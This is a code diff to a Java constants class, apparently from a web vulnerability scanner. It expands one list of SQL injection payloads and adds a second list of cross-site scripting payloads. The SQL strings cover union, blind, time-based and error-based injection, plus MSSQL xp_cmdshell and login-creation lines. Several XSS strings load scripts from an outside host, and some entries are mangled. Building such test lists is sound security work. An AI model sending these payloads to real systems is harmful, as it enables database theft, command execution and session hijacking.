@@ -27,9 +27,50 @@ public class Const {
     private static Utils FileUtils;
 
     public final static String[] getSQlText(){
-        String[] strings={"and ascii(substr((select database()),1,1))>64", "id=1 union select if(SUBSTRING(user(),1,4)='root',sleep(4),1),null,null", "id =-1 union select 1,2,3", "id=1' substr(database(),1,1)='t'--+", "union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a", "id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))"};
+        String[] strings={
+                "and ascii(substr((select database()),1,1))>64",
+                "id=1 union select if(SUBSTRING(user(),1,4)='root',sleep(4),1),null,null",
+                "id =-1 union select 1,2,3", "id=1' substr(database(),1,1)='t'--+",
+                "union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a", "id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))",
+                "and 0<>(select count(*) from *) ",
+                "and 0<>(select count(*) from admin)",
+                "and 0<(select count(*) from admin) ",
+                "and 1<(select count(*) from admin)",
+                "group by users.id having 1=1-- ",
+                "and 1=(select count(*) from admin where len(*)>0) ",
+                "and 1=(select count(*) from admin where len(name)>6) ",
+                "and 1=(select count(*) from admin where len(name)>5) ",
+                ";exec master..xp_blank>_cmdshell dir",
+                ";exec master.dbo.sp_blank>_addlogin jiaoniang$;"
+        };
         return strings;
 
+    }
+    public final static String[] getXssTest()
+    {
+       return new String[]{
+               "<IMG SRC=\" javascript:alert('XSS');\">",
+               "<SCRIPT/XSS SRC=\"http://3w.org/XSS/xss.js\"></SCRIPT>",
+               "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
+               "<SCRIPT/SRC=\"http://3w.org/XSS/xss.js\"></SCRIPT>\n",
+               "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
+               "<SCRIPT SRC=http://3w.org/XSS/xss.js?<B>",
+               "<SCRIPT SRC=//3w.org/XSS/xss.js>\n",
+               "<IMG SRC=\"javascript:alert('XSS')\"\n",
+               "<iframe src=http://3w.org/XSS.html <",
+               "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS\n",
+               "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>\n",
+               "<TABLE BACKGROUND=\"javascript:alert('XSS')\">\n",
+               "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">\n",
+               "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
+               "<DIV STYLE=\"width: expression_r(alert('XSS'));\">\n",
+               "<IMG STYLE=\"xss:expression_r(alert('XSS'))\">\n",
+               "<XSS STYLE=\"xss:expression_r(alert('XSS'))\">\n",
+               "exppression(alert(\"XSS\"))'>",
+               "<BASE HREF=\"javascript:alert('XSS');//\">\n",
+               "<EMBED SRC=\"http://3w.org/XSS/xss.swf\" ></EMBED>",
+               "<SCRIPT =\">\" SRC=\"http://3w.org/xss.js\"></SCRIPT>"
+       };
     }
 
     public final static String[] getCommomText(){
